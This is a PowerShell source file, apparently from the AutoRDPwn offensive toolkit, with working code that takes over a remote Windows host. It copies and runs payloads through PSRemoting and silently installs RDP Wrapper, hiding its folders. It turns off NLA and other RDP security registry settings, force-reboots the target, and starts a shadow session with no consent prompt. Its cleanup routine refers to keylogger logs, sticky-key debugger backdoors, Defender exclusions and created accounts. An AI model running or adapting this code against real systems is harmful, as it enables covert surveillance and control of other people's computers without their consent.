        [Parameter(Mandatory = $true)][scriptblock]$ScriptBlock,
        [object[]]$ArgumentList = @()
    )
    if (Test-ARIsLocalTarget) { return (& $ScriptBlock @ArgumentList) }
    $session = Get-ARTargetSession
    return Invoke-Command -Session $session -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList -ErrorAction Stop
}

function New-ARWorkDirectory {
    $directory = Join-Path $script:ARTools ('work_' + [guid]::NewGuid().ToString('N'))
    New-Item -ItemType Directory -Path $directory -Force | Out-Null
    $script:ARWorkDirs.Add($directory)
    return $directory
}

function Copy-ARFileToTarget {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [Parameter(Mandatory = $true)][string]$RemotePath
    )
    if (-not (Test-Path -LiteralPath $LocalPath)) { throw "File not found: $LocalPath" }
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $destination = Join-Path $directory (Split-Path -Leaf $LocalPath)
        Copy-Item -LiteralPath $LocalPath -Destination $destination -Force
        return $destination
    }
    $session = Get-ARTargetSession
    $remoteDirectory = Split-Path -Parent $RemotePath
    Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock {
        param($path)
        if (-not (Test-Path -LiteralPath $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
    } -ErrorAction Stop
    try {
        Copy-Item -LiteralPath $LocalPath -Destination $RemotePath -ToSession $session -Force -ErrorAction Stop
    }
    catch {
        $bytes = [System.IO.File]::ReadAllBytes($LocalPath)
        $chunkSize = 48000
        $first = $true
        for ($offset = 0; $offset -lt $bytes.Length; $offset += $chunkSize) {
            $length = [Math]::Min($chunkSize, $bytes.Length - $offset)
            $base64 = [Convert]::ToBase64String($bytes, $offset, $length)
            Invoke-Command -Session $session -ArgumentList $RemotePath, $base64, $first -ScriptBlock {
                param($path, $data, $create)
                $chunk = [Convert]::FromBase64String($data)
                if ($create) {
                    [System.IO.File]::WriteAllBytes($path, $chunk)
                }
                else {
                    $stream = [System.IO.File]::Open($path, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write)
                    try { $stream.Write($chunk, 0, $chunk.Length) } finally { $stream.Dispose() }
                }
            } -ErrorAction Stop
            $first = $false
        }
    }
    return $RemotePath
}

function Invoke-ARTargetPowerShell {
    param(
        [Parameter(Mandatory = $true)][string]$RelativePath,
        [string]$Function = '',
        [hashtable]$Arguments = @{},
        [string]$Command = ''
    )
    $localPath = Get-ARResourcePath $RelativePath
    if (Test-ARIsLocalTarget) {
        $directory = New-ARWorkDirectory
        $scriptPath = Join-Path $directory (Split-Path -Leaf $localPath)
        Copy-Item -LiteralPath $localPath -Destination $scriptPath -Force
        Push-Location $directory
        try {
            return (& {
                param($path, $functionName, $argumentMap, $commandText)
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            } $scriptPath $Function $Arguments $Command)
        }
        finally {
            Pop-Location
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $scriptPath = Join-Path $remoteDirectory (Split-Path -Leaf $localPath)
    Copy-ARFileToTarget -LocalPath $localPath -RemotePath $scriptPath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $scriptPath, $Function, $Arguments, $Command -ScriptBlock {
            param($path, $functionName, $argumentMap, $commandText)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($commandText -ne '') { Invoke-Expression $commandText }
                elseif ($functionName -ne '') {
                    $splat = @{}
                    if ($argumentMap) { foreach ($key in $argumentMap.Keys) { $splat[$key] = $argumentMap[$key] } }
                    & $functionName @splat
                }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Invoke-ARTargetBinary {
    param(
        [Parameter(Mandatory = $true)][string]$LocalPath,
        [string[]]$Arguments = @(),
        [string]$RemoteName = ''
    )
    if ([string]::IsNullOrWhiteSpace($RemoteName)) { $RemoteName = Split-Path -Leaf $LocalPath }
    if (Test-ARIsLocalTarget) {
        return (& $LocalPath @Arguments 2>&1)
    }
    $session = Get-ARTargetSession
    $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
    $remotePath = Join-Path $remoteDirectory $RemoteName
    Copy-ARFileToTarget -LocalPath $LocalPath -RemotePath $remotePath | Out-Null
    try {
        return Invoke-Command -Session $session -ArgumentList $remotePath, $Arguments -ScriptBlock {
            param($path, $binaryArguments)
            & $path @binaryArguments 2>&1
        } -ErrorAction Stop
    }
    finally {
        try { Invoke-Command -Session $session -ArgumentList $remoteDirectory -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue } catch { }
    }
}

function Get-ARPayloads {
    param([switch]$IncludeCreateUser)
    $payloads = New-Object System.Collections.Generic.List[string]
    foreach ($name in @('Pwn1', 'Pwn2', 'Pwn3', 'Pwn4')) {
        $value = Get-ARText $name ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    if ($IncludeCreateUser -or $script:ARCreateUser) {
        $value = Get-ARText 'Pwn5' ''
        if (-not [string]::IsNullOrWhiteSpace($value)) { $payloads.Add($value) }
    }
    return $payloads.ToArray()
}

function Get-ARSessionId {
    param($Lines = $null, [int]$Fallback = 1)
    # $Lines is kept for callers that still hand over `query session` output; that
    # output is localised, so it is only ever displayed, never parsed.
    $discovery = {
        try {
            $explorer = Get-CimInstance -ClassName Win32_Process -Filter "Name = 'explorer.exe'" -ErrorAction Stop |
                Sort-Object SessionId | Select-Object -Last 1
            if ($explorer -and [int]$explorer.SessionId -gt 0) { return [int]$explorer.SessionId }
        }
        catch { }
        try {
            $logons = @(Get-CimInstance -ClassName Win32_LogonSession -ErrorAction Stop |
                Where-Object { $_.LogonType -eq 2 -or $_.LogonType -eq 10 } |
                Sort-Object StartTime)
            foreach ($logon in $logons) {
                $processes = @(Get-CimAssociatedInstance -InputObject $logon -ResultClassName Win32_Process -ErrorAction SilentlyContinue)
                $ids = @($processes | Where-Object { $_.SessionId -gt 0 } | ForEach-Object { [int]$_.SessionId } | Sort-Object -Unique)
                if ($ids.Count -gt 0) { return [int]$ids[$ids.Count - 1] }
            }
        }
        catch { }
        return 0
    }
    $sessionId = 0
    $session = $null
    # A missing $script:ARTarget (early teardown, tests) must not turn this into a throw.
    $local = $true
    try { $local = Test-ARIsLocalTarget } catch { $local = $true }
    if ($Lines -is [System.Management.Automation.Runspaces.PSSession]) { $session = $Lines }
    elseif (-not $local) { $session = $script:ARSession }
    if ($session) {
        try { $sessionId = [int](Invoke-Command -Session $session -ScriptBlock $discovery -ErrorAction Stop) } catch { $sessionId = 0 }
    }
    elseif ($local) {
        try { $sessionId = [int](& $discovery) } catch { $sessionId = 0 }
    }
    if ($sessionId -gt 0) { return $sessionId }
    return $Fallback
}

function Install-ARRdpWrap {
    param([Parameter(Mandatory = $true)]$Session)
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-RDPwrap.ps1'
    Push-Location $script:ARTools
    try {
        . $scriptPath
        if (-not $RDPWrap) { throw 'RDPWrap payload is empty.' }
        $directory = New-ARWorkDirectory
        $msiPath = Join-Path $directory 'Setup.msi'
        [System.IO.File]::WriteAllBytes($msiPath, $RDPWrap)
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwn_' + [guid]::NewGuid().ToString('N')
        $remoteMsi = Join-Path $remoteDirectory 'Setup.msi'
        $remoteMsi = Copy-ARFileToTarget -LocalPath $msiPath -RemotePath $remoteMsi
        $ruleName = Get-ARText 'Pwn6' 'RDP session agent'
        if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) }
        $uninstallRoots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
        Write-ARProgress -Activity 'Installing RDP Wrap' -Percent 10 -Status 'Installing MSI on target'
        $install = Invoke-ARRemote -Session $Session -ArgumentList $remoteMsi, $ruleName, $uninstallRoots -ScriptBlock {
            param($msi, $rule, $roots)
            # Products present before this run: anything else in the diff came from us.
            $before = @{}
            foreach ($root in $roots) {
                if (-not (Test-Path -LiteralPath $root)) { continue }
                foreach ($key in @(Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue)) {
                    $before[$key.PSChildName] = [string](Get-ItemProperty -LiteralPath $key.PSPath -Name DisplayName -ErrorAction SilentlyContinue).DisplayName
                }
            }
            $process = Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', $msi, '/quiet', '/qn', '/norestart') -Wait -PassThru
            netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            netsh advfirewall firewall add rule name="$rule" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
            attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null
            attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null
            if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 -ErrorAction SilentlyContinue }
            $products = New-Object System.Collections.Generic.List[string]
            if ($process.ExitCode -eq 0 -or $process.ExitCode -eq 3010) {
                foreach ($root in $roots) {
                    if (-not (Test-Path -LiteralPath $root)) { continue }
                    foreach ($key in @(Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue)) {
                        if (-not $before.ContainsKey($key.PSChildName)) { $products.Add([string]$key.PSChildName) }
                    }
                }
            }
            Remove-Item -LiteralPath (Split-Path -Parent $msi) -Recurse -Force -ErrorAction SilentlyContinue
            return [pscustomobject]@{ ExitCode = $process.ExitCode; Products = @($products.ToArray()) }
        }
        Write-ARProgress -Activity 'Installing RDP Wrap' -Percent 100 -Status 'Install finished'
        foreach ($product in @($install.Products)) {
            if ([string]::IsNullOrWhiteSpace([string]$product)) { continue }
            if (-not $script:ARInstalledProducts.Contains([string]$product)) { $script:ARInstalledProducts.Add([string]$product) }
        }
        if ($install.ExitCode -ne 0 -and $install.ExitCode -ne 3010) {
            Write-ARWarn ('RDPWrap installer returned ' + $install.ExitCode)
        }
    }
    finally {
        Pop-Location
    }
}

function Invoke-ARShadowEngine {
    $target = Get-ARTargetComputer
    $credential = $script:AROverrideCredential
    if (-not $credential) { $credential = Get-ARTargetCredential }
    $session = Get-ARTargetSession
    $control = $true
    if ($script:ARShadowPreference -in @('see', 'view', 'ver', 'regarder', 'siehe', 'vedere')) { $control = $false }
    elseif ($script:ARShadowPreference -in @('control', 'controlar', 'controle', 'kontrolle', 'controllo')) { $control = $true }
    elseif ([string]$script:ARTarget['Mode'] -eq 'view') { $control = $false }

    Write-ARInfo (Get-ARText 'txt32' 'Changes in the Windows registry made successfully!')
    $previous = Invoke-Command -Session $session -ErrorAction Stop -ScriptBlock {
        $terminalServer = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
        $winstation = 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
        $registryBackup = New-Object System.Collections.Generic.List[object]
        function Get-ARRemoteValue($path, $name) {
            try {
                $item = Get-ItemProperty -Path $path -Name $name -ErrorAction Stop
                return $item.$name
            }
            catch { return $null }
        }
        # Every write records the previous state first so cleanup can replay it.
        function Save-ARRemoteValue($path, $name) {
            $entry = [pscustomobject]@{
                KeyPath = $path
                Name    = $name
                Existed = $false
                Value   = $null
                Kind    = 'String'
            }
            try {
                $key = Get-Item -LiteralPath $path -ErrorAction Stop
                if (@($key.GetValueNames()) -contains $name) {
                    $entry.Existed = $true
                    $entry.Value = $key.GetValue($name, $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
                    $entry.Kind = [string]$key.GetValueKind($name)
                }
            }
            catch { }
            $registryBackup.Add($entry)
        }
        function Set-ARRemoteDword($path, $name, $value) {
            Save-ARRemoteValue $path $name
            New-ItemProperty -Path $path -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
        }
        $allowRemoteRpc = Get-ARRemoteValue $terminalServer 'AllowRemoteRPC'
        Set-ARRemoteDword $terminalServer 'AllowRemoteRPC' 1
        Set-ARRemoteDword $terminalServer 'fDenyTSConnections' 0
        Set-ARRemoteDword 'HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM' 'AllowAnonymousCallback' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 'DisableRestrictedAdmin' 0
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'AutoShareWks' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' 'AutoShareServer' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' 'fAllowToGetHelp' 1
        Set-ARRemoteDword 'HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance' 'fAllowFullControl' 1
        Set-ARRemoteDword $winstation 'SecurityLayer' 0
        Set-ARRemoteDword $winstation 'UserAuthentication' 0
        Set-ARRemoteDword 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' 'LocalAccountTokenFilterPolicy' 1
        New-Item -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' -Force | Out-Null
        Set-ARRemoteDword 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' 'AllowEncryptionOracle' 2
        Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' -ErrorAction SilentlyContinue
        if (-not (Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any -ErrorAction SilentlyContinue | Out-Null
        }
        $caption = (Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        $isServer = $caption -like '*Server*'
        $sessionId = $null
        if (-not $isServer) {
            try { $sessionId = (Get-Process explorer -ErrorAction SilentlyContinue | Sort-Object SessionId | Select-Object -Last 1).SessionId } catch { }
            if (-not $sessionId) { $sessionId = 1 }
        }
        [pscustomobject]@{
            AllowRemoteRpc = $allowRemoteRpc
            IsServer = $isServer
            HostName = $env:COMPUTERNAME
            SessionId = $sessionId
            Caption = $caption
            RegistryBackup = @($registryBackup.ToArray())
        }
    }
    foreach ($entry in @($previous.RegistryBackup)) {
        if (-not $entry) { continue }
        # The oldest snapshot wins: a second run must not record the values it just wrote.
        $known = $false
        foreach ($existing in $script:ARRegistryBackup) {
            if ($existing.KeyPath -eq $entry.KeyPath -and $existing.Name -eq $entry.Name) { $known = $true; break }
        }
        if (-not $known) { $script:ARRegistryBackup.Add($entry) }
    }

        $plain = ''
        if ($credential) { $plain = $credential.GetNetworkCredential().Password }
        if ($credential -and $plain -ne '') {
            # Tracked before the add: an interrupted run must still delete the credential.
            if (-not $script:ARCmdKeyTargets.Contains($target)) { $script:ARCmdKeyTargets.Add($target) }
            $stored = $false
            try {
                cmdkey.exe "/add:$target" "/user:$($credential.UserName)" "/pass:$plain" 2>&1> $null
                if ($LASTEXITCODE -ne 0) { throw ('cmdkey /add exited with code ' + $LASTEXITCODE) }
                $stored = $true
            }
            catch {
                Write-ARWarn ('Stored credential for ' + $target + ' was not created: ' + $_.Exception.Message)
            }
            finally {
                if (-not $stored) { cmdkey.exe "/delete:$target" 2>&1> $null }
            }
        }
        Write-ARInfo ((([string](Get-ARText 'txt33' 'Detecting operating system version on')).TrimEnd()) + ' ' + ([string]$previous.HostName).ToLowerInvariant())
        if ($null -eq $previous.AllowRemoteRpc -or [int]$previous.AllowRemoteRpc -eq 0) {
            Write-ARWarn (Get-ARText 'txt86' 'The remote machine needs a reboot to apply the changes, rebooting..')
            try { Invoke-Command -Session $session -ScriptBlock { Restart-Computer -Force } -ErrorAction SilentlyContinue } catch { }
            try { Remove-PSSession -Session $session -ErrorAction SilentlyContinue } catch { }
            $script:ARSession = $null
            Start-Sleep -Seconds 60
            $session = $null
            for ($attempt = 0; $attempt -lt 30; $attempt++) {
                Start-Sleep -Seconds 3
                try {
                    $session = Connect-ARTargetSession -Credential $credential -Force
                    if ($session) { break }
                } catch { }
            }
            if (-not $session) { throw 'The target did not come back after the reboot.' }
        }

        if ($previous.IsServer) {
            try {
                Invoke-Command -Session $session -ScriptBlock {
                    (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) | Out-Null
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
            $query = Invoke-Command -Session $session -ScriptBlock { query session 2>&1 } -ErrorAction SilentlyContinue
            Show-ARText $query
            $sessionId = Get-ARSessionId -Lines $session -Fallback 1
            if (-not $script:ARInvokedFromOption) {
                $answer = Read-ARValue (Get-ARText 'txt36' 'What session do you want to connect to?') ([string]$sessionId)
                if ($answer -match '^\d+$') { $sessionId = [int]$answer }
            }
        }
        else {
            $sessionId = [int]$previous.SessionId
            if (-not $sessionId) { $sessionId = 1 }
            try { Install-ARRdpWrap -Session $session }
            catch { Write-ARWarn ('RDPWrap could not be installed: ' + $_.Exception.Message) }
        }

        $arguments = @("/v:$target", '/admin')
        if ($sessionId) {
            $arguments += "/shadow:$sessionId"
            $arguments += '/noconsentprompt'
            if ($control) { $arguments += '/control' }
        }
        $arguments += '/f'
        if ($script:ARNoGui) {
            Write-Host ('mstsc ' + ($arguments -join ' ')) -ForegroundColor DarkGray
        }
        else {
            Write-ARInfo (Get-ARText 'txt38' 'Starting remote connection!')
            Start-Process -FilePath 'mstsc.exe' -ArgumentList $arguments | Out-Null
        }
        return [pscustomobject]@{ Control = $control; SessionId = $sessionId; FullDesktop = (-not $sessionId) }
}


function Invoke-ARAction {
    param([Parameter(Mandatory = $true)][string]$Id)
    $action = Get-ARActionById $Id
    if (-not $action) {
        Write-ARError 'Unknown action.'
        return
    }
    Clear-ARScreen
    Set-ARStatus ($action.Title) 'Info'
    $script:ARLastFailure = ''
    try {
        & $action.Handler
        if ($script:ARStatus['Kind'] -eq 'Info') { Set-ARStatus ($action.Title + ' finished') 'Ok' }
    }
    catch {
        $script:ARLastFailure = $_.Exception.Message
        Set-ARStatus $_.Exception.Message 'Error'
        Write-ARError $_.Exception.Message
    }
    if (-not $script:ARInvokedFromOption) {
        Write-ARBlank
        Write-Host ' Press any key to return to the menu' -ForegroundColor DarkGray
        try { $null = [Console]::ReadKey($true) } catch { try { Read-Host | Out-Null } catch { } }
    }
}

function Remove-ARTargetArtifacts {
    param([System.Management.Automation.Runspaces.PSSession]$Session)
    $status = [pscustomobject]@{
        HadSession = $false
        Errors     = 0
        Skipped    = New-Object System.Collections.Generic.List[string]
    }
    if (-not $Session) {
        $status.Skipped.Add('target session')
        return $status
    }
    $status.HadSession = $true
    $tempDirs = @($script:ARRemoteTempDirs.ToArray())
    $accounts = @($script:ARCreatedAccounts.ToArray())
    if ($script:ARHashUserName -ne '') { $accounts += $script:ARHashUserName }
    $rules = @($script:ARFirewallRules.ToArray())
    try {
        Invoke-ARRemote -Session $Session -ArgumentList $tempDirs, $accounts, $rules -ScriptBlock {
            param($dirs, $users, $firewallRules)
            Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Stop-Job -ErrorAction SilentlyContinue
            Get-Job -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'AutoRDPwn_*' } | Remove-Job -Force -ErrorAction SilentlyContinue
            # Tasks created by the stealth screen module survive an interrupted run.
            try {
                Get-ScheduledTask -ErrorAction Stop | Where-Object {
                    $_.TaskName -like 'AutoRDPwn*' -or ($_.TaskName -match '^W[0-9A-F]{8}$' -and (($_.Actions | ForEach-Object { [string]$_.Execute + ' ' + [string]$_.Arguments }) -join ' ') -match 'Windows\\Temp\\W[0-9A-F]{8}\.ps1')
                } | ForEach-Object {
                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                }
            }
            catch { }
            Remove-Item -LiteralPath 'C:\Windows\Temp\vncb64.txt', 'C:\Windows\Temp\vnc.ps1', 'C:\Windows\Temp\vnclog.txt', 'C:\Windows\Temp\ss.ps1' -Force -ErrorAction SilentlyContinue
            Get-ChildItem -LiteralPath 'C:\Windows\Temp' -Directory -Filter 'AutoRDPwn*' -ErrorAction SilentlyContinue |
                Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
            foreach ($directory in $dirs) {
                Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
            }
            foreach ($service in @('WinShotSvc', 'WinSessionSvc')) {
                if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
                    sc.exe stop $service 2>&1> $null
                    sc.exe delete $service 2>&1> $null
                }
            }
            foreach ($userName in $users) {
                if (-not $userName) { continue }
                try {
                    if (Get-LocalUser -Name $userName -ErrorAction Stop) {
                        net user $userName /delete 2>&1> $null
                        Remove-Item -LiteralPath (Join-Path 'C:\Users' $userName) -Recurse -Force -ErrorAction SilentlyContinue
                    }
                }
                catch { }
            }
            foreach ($key in @('sethc.exe', 'Utilman.exe')) {
                $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\' + $key
                try {
                    $debugger = (Get-ItemProperty -Path $path -Name 'Debugger' -ErrorAction Stop).Debugger
                    if ([string]$debugger -like 'powershell.exe -noexit*') {
                        Remove-ItemProperty -Path $path -Name 'Debugger' -Force -ErrorAction SilentlyContinue
                    }
                }
                catch { }
            }
            foreach ($rule in @($firewallRules + 'AutoRDPwn-TermService-RPC-In')) {
                netsh advfirewall firewall delete rule name="$rule" 2>&1> $null
            }
        } | Out-Null
    }
    catch {
        $status.Errors++
        $status.Skipped.Add('target artifacts')
        Write-ARWarn ('Target cleanup incomplete: ' + $_.Exception.Message)
    }

    # Registry values written by the shadow engine: replay the state read before each write.
    $registryBackup = @($script:ARRegistryBackup.ToArray())
    if ($registryBackup.Count -gt 0) {
        try {
            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList (, $registryBackup) -ScriptBlock {
                param($entries)
                $failed = New-Object System.Collections.Generic.List[string]
                foreach ($entry in $entries) {
                    $path = [string]$entry.KeyPath
                    $name = [string]$entry.Name
                    try {
                        if (-not (Test-Path -LiteralPath $path)) { continue }
                        if (-not $entry.Existed) {
                            Remove-ItemProperty -Path $path -Name $name -Force -ErrorAction SilentlyContinue
                            continue
                        }
                        $kind = [string]$entry.Kind
                        $value = $entry.Value
                        if ($kind -eq 'MultiString') { $value = [string[]]@($entry.Value) }
                        elseif ($kind -eq 'Binary') { $value = [byte[]]@($entry.Value) }
                        elseif ($kind -eq 'DWord' -or $kind -eq 'QWord') { $value = [int64]$entry.Value }
                        else { $value = [string]$entry.Value }
                        New-ItemProperty -Path $path -Name $name -Value $value -PropertyType $kind -Force -ErrorAction SilentlyContinue | Out-Null
                    }
                    catch { $failed.Add($name + ': ' + $_.Exception.Message) }
                }
                return $failed.ToArray()
            })
            foreach ($failure in $failures) {
                $status.Errors++
                $status.Skipped.Add('registry: ' + [string]$failure)
                Write-ARWarn ('Registry value not restored: ' + [string]$failure)
            }
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('registry restore')
            Write-ARWarn ('Registry restore incomplete: ' + $_.Exception.Message)
        }
        $script:ARRegistryBackup.Clear()
    }

    # MSI products that appeared during this run: uninstall them by product code.
    $products = @($script:ARInstalledProducts.ToArray())
    if ($products.Count -gt 0) {
        try {
            Write-ARProgress -Activity 'Uninstalling MSI products' -Percent 10 -Status ('Removing ' + $products.Count + ' product(s)')
            $failures = @(Invoke-ARRemote -Session $Session -ArgumentList (, $products) -ScriptBlock {
                param($productCodes)
                $roots = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
                $failed = New-Object System.Collections.Generic.List[string]
                foreach ($code in $productCodes) {
                    try {
                        if ([string]$code -match '^\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}$') {
                            Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/x', [string]$code, '/qn', '/norestart') -Wait
                        }
                        foreach ($root in $roots) {
                            $key = Join-Path $root ([string]$code)
                            if (Test-Path -LiteralPath $key) { Remove-Item -LiteralPath $key -Recurse -Force -ErrorAction SilentlyContinue }
                        }
                    }
                    catch { $failed.Add([string]$code + ': ' + $_.Exception.Message) }
                }
                return $failed.ToArray()
            })
            Write-ARProgress -Activity 'Uninstalling MSI products' -Percent 100 -Status 'Uninstall finished'
            foreach ($failure in $failures) {
                $status.Errors++
                $status.Skipped.Add('msi: ' + [string]$failure)
                Write-ARWarn ('MSI product not removed: ' + [string]$failure)
            }
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('msi uninstall')
            Write-ARWarn ('MSI uninstall incomplete: ' + $_.Exception.Message)
        }
        $script:ARInstalledProducts.Clear()
    }

    # Firewall rules we re-enabled during the run go back to disabled.
    $firewallRestore = @($script:ARFirewallRestore.ToArray())
    if ($firewallRestore.Count -gt 0) {
        try {
            $ruleNames = @($firewallRestore | ForEach-Object { [string]$_.Name } | Where-Object { $_ -ne '' })
            Invoke-ARRemote -Session $Session -ArgumentList (, $ruleNames) -ScriptBlock {
                param($names)
                foreach ($name in $names) {
                    Set-NetFirewallRule -Name $name -Enabled False -ErrorAction SilentlyContinue
                }
            } | Out-Null
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('firewall restore')
            Write-ARWarn ('Firewall rules not restored: ' + $_.Exception.Message)
        }
        $script:ARFirewallRestore.Clear()
    }

    # Defender preferences changed on the target get replayed to their prior state.
    $defenderChanges = @($script:ARRemoteDefenderChanges.ToArray())
    if ($defenderChanges.Count -gt 0) {
        try {
            Invoke-ARRemote -Session $Session -ArgumentList (, $defenderChanges) -ScriptBlock {
                param($changes)
                foreach ($change in $changes) {
                    $kind = [string]$change.Kind
                    if ($kind -eq 'ExclusionPath') {
                        Remove-MpPreference -ExclusionPath ([string]$change.Name) -ErrorAction SilentlyContinue
                    }
                    elseif ($kind -eq 'DisableRealtimeMonitoring') {
                        Set-MpPreference -DisableRealtimeMonitoring ([bool]$change.Value) -ErrorAction SilentlyContinue
                    }
                }
            } | Out-Null
        }
        catch {
            $status.Errors++
            $status.Skipped.Add('defender restore')
            Write-ARWarn ('Defender preferences not restored: ' + $_.Exception.Message)
        }
        $script:ARRemoteDefenderChanges.Clear()
    }
    return $status
}

function Invoke-ARCleanup {
    if ($script:ARCleanupDone) { return }
    $script:ARCleanupDone = $true
    $targetStatus = $null
    if (-not $script:ARNoClean) {
        $targetStatus = Remove-ARTargetArtifacts -Session $script:ARSession
        $script:ARHashUserName = ''
    }
    # Operator-side traces are always removed, even with -noclean: a stored
    # credential or an extracted binary must not outlive the session.
    foreach ($target in $script:ARCmdKeyTargets.ToArray()) {
        cmdkey.exe "/delete:$target" 2>&1> $null
    }
    $script:ARCmdKeyTargets.Clear()
    # Module artifacts (keylogger log, RDP cache) live on the target, so they
    # have to go while the session is still open. The operator-side proxy reset
    # below can wait until after teardown.
    if (Get-Command Remove-ARModuleArtifacts -ErrorAction SilentlyContinue) {
        try { Remove-ARModuleArtifacts } catch { }
    }
    Close-ARTargetSession
    Restore-ARDefender
    foreach ($directory in $script:ARWorkDirs.ToArray()) {
        if (Test-Path -LiteralPath $directory) {
            Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    foreach ($file in $script:ARTemporaryFiles.ToArray()) {
        if (Test-Path -LiteralPath $file) {
            Remove-Item -LiteralPath $file -Force -ErrorAction SilentlyContinue
        }
    }
    $script:ARWorkDirs.Clear()
    $script:ARTemporaryFiles.Clear()
    $script:ARRemoteTempDirs.Clear()
    $script:ARRemoteTasks.Clear()
    $script:ARCreatedAccounts.Clear()
    $script:ARFirewallRules.Clear()
    $script:AROverrideCredential = $null
    if (Get-Command Reset-AROperatorPortProxies -ErrorAction SilentlyContinue) {
        try { Reset-AROperatorPortProxies } catch { }
    }
    try { Set-Location -LiteralPath $script:AROriginalLocation } catch { }
    if ($targetStatus -and -not $targetStatus.HadSession) {
        $targetName = 'the target'
        try { $targetName = Get-ARTargetComputer } catch { }
        Write-ARWarn ('Cleanup skipped: no session to ' + $targetName)
    }
    elseif ($targetStatus -and $targetStatus.Errors -gt 0) {
        $steps = @($targetStatus.Skipped | Select-Object -First 5)
        Write-ARWarn ((Get-ARText 'txt76' 'Cleaning done!') + ' ' + $targetStatus.Errors + ' step(s) failed: ' + ($steps -join '; '))
    }
    else {
        Write-ARInfo (Get-ARText 'txt76' 'Cleaning done!')
    }
}